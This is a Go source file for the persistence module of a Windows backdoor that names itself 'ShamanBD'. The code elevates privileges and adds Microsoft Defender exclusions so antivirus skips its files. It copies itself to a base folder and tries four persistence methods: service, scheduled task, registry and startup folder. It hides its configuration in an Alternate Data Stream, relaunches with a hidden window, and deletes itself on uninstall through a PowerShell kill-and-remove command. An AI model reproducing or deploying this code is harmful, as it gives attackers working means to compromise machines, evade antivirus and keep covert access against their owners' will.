package persistence

import (
	"encoding/gob"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path"
	"syscall"
	"time"
)

type installInfo struct {
	Loaded    bool
	Base      string
	Date      time.Time
	PType     int
	Exclusion bool
}

// Info contains persistent configuration details
var Info installInfo

const (
	cmdUninstall = "kill %d -F;rm '%s' -R -Fo"
)

// IsInstalled checks whether or not a valid Base is already present on the system.
func IsInstalled() bool {
	_, err := os.Stat(os.Args[0] + ":" + Ads)
	return !os.IsNotExist(err)
}

var (
	Ads         = "string"
	DisplayName = "ShamanBD"
	Description = "Shamans' Backdoor | 7heDeadBunnyCollectiv3"
)

// WriteInstallInfo dumps the current configuration to an Alternate Data Stream in binary format.
func WriteInstallInfo() error {

	Info.Loaded = true

	var fn string
	if Info.Base != "" {
		fn = path.Join(Info.Base, Binary)
	} else {
		fn = os.Args[0]
	}

	f, err := os.Create(fn + ":" + Ads)
	if err != nil {
		return err
	}
	defer f.Close()

	enc := gob.NewEncoder(f)
	enc.Encode(Info)

	return nil
}

// ReadInstallInfo attempts to read the stored configuration and initialize Info.
func ReadInstallInfo() error {
	f, err := os.Open(os.Args[0] + ":" + Ads)
	if err != nil {
		return err
	}
	defer f.Close()
	enc := gob.NewDecoder(f)
	return enc.Decode(&Info)
}

func Perc(ptype int, _dir int) error {
	var direction bool
	if _dir == 0 {
		direction = true
	} else {
		direction = false
	}
	switch ptype {
	case 0:
		if direction {
			return TryServiceInstall()
		} else {
			return UninstallService()
		}
	case 1:
		if direction {
			return TryTaskInstall()
		} else {
			return UninstallTask()
		}
	case 2:
		if direction {
			return TryRegistryInstall()
		} else {
			return UninstallRegistry(nil)
		}
	case 3:
		if direction {
			return TryFolderInstall()
		} else {
			return UninstallFolder()
		}
	}
	return nil
}

func persist(ptype int) error {
	switch ptype {
	case 0:
		return TryServiceInstall()
	case 1:
		return TryTaskInstall()
	case 2:
		return TryRegistryInstall()
	case 3:
		return TryFolderInstall()
	}
	return nil
}
func calm() {
	if r := recover(); r != nil {
		log.Println("Recovered from", r)
	}
}

// Install attempts to deploy the binary to the system and establish persistence.
// It also assembles the install configuration and saves it.
func Install() {
	defer calm()
	Info.Date = time.Now()

	admin := false
	log.Println("Attempting elevation")
	if err := ElevateLogic(); err != nil {
		log.Println("Elevation error:", err)
	} else {
		admin = true
		if err = AddDefenderExclusion(os.Args[0]); err != nil {
			log.Println("Adding temporary exclusion failed,", err)
		} else {
			log.Println("Temporary exclusion added successfully")
		}
	}

	base, err := CreateBase()
	log.Println(err, "Base creation failed")
	Info.Base = base
	log.Println("Base set:", base)

	if admin {
		if err = AddDefenderExclusion(base); err != nil {
			log.Println("Adding base exclusion failed,", err)
		} else {
			Info.Exclusion = true
			log.Println("Base exclusion added successfully")
		}
	}

	err = CopyExecutable()
	if err != nil {
		log.Println("Binary relocation failed,", err)
	} else {
		log.Println("Binary relocation successful")
	}

	for i := 0; i < 4; i++ {
		if err := persist(i); err == nil {
			log.Printf("Persistence method #%d worked\n", i)
			Info.PType = i
			break
		} else {
			log.Println(i, err)
		}
	}

	err = WriteInstallInfo()
	log.Println(err, "Failed to dump install configuration")
	if admin {
		if err = RemoveDefenderExclusion(os.Args[0]); err != nil {
			log.Println("Failed to remove temporary exclusion,", err)
			defer log.Println("Error: " + err.Error())
		} else {
			defer log.Println("temporary exclusion removed successfully")
		}
	}

	log.Println("Install complete")
	Restart("")
}

// Uninstall attempts to undo all of the changes done to the system by Install.
func Uninstall() []string {
	r := make([]string, 5)
	for i := range r {
		r[i] = "✔️"
	}

	if err := UninstallService(); err != nil {
		r[0] = err.Error()
	}
	if err := UninstallTask(); err != nil {
		r[1] = "⚠️"
	}
	if err := UninstallRegistry(nil); err != nil {
		r[2] = err.Error()
	}
	if err := UninstallFolder(); err != nil {
		r[3] = "⚠️"
	}
	if err := RemoveDefenderExclusion(Info.Base); err != nil {
		r[4] = "⚠️"
	}
	//api.FlatLine(api.Genesis)

	//Remove self
	go func() {
		time.Sleep(10 * time.Second)
		log.Println("Oh shit")
		cmd := fmt.Sprintf(cmdUninstall, os.Getpid(), Info.Base)
		runPowershellInternal(cmd, true)
	}()

	return r
}

func Restart(arg string) {
	bin := path.Join(Info.Base, Binary)
	dSta := true
	// if util.Dbg {
	// 	log.Println("File: " + bin + "\nArg: " + arg)
	// 	dSta = false
	// }
	cmd := exec.Command(bin, arg)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: dSta}
	cmd.Start()
	os.Exit(0)
}
